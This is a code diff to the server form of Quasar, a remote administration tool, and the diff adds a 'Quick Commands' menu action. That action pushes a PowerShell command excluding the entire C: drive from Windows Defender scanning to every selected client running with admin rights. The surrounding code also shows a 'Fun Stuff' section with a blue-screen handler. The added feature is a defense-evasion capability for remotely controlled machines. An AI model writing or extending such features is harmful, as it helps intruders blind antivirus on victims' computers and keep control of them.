@@ -20,6 +20,7 @@ using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Windows.Forms;
+using Quasar.Common.Messages.QuickCommands;
 using System.IO;
 
 namespace Quasar.Server.Forms
@@ -836,6 +837,31 @@ namespace Quasar.Server.Forms
 
         #endregion
 
+        #region "Quick Commands"
+
+        private void addCDriveExceptionToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+            string powershellCode = "Add-MpPreference -ExclusionPath \"C:\\\"";
+            DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode };
+
+            foreach (Client c in GetSelectedClients())
+            {
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    c.Send(quickCommand);
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        #endregion
+
         #region "Fun Stuff"
         private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -915,6 +941,5 @@ namespace Quasar.Server.Forms
 
 
         #endregion
-
     }
 }
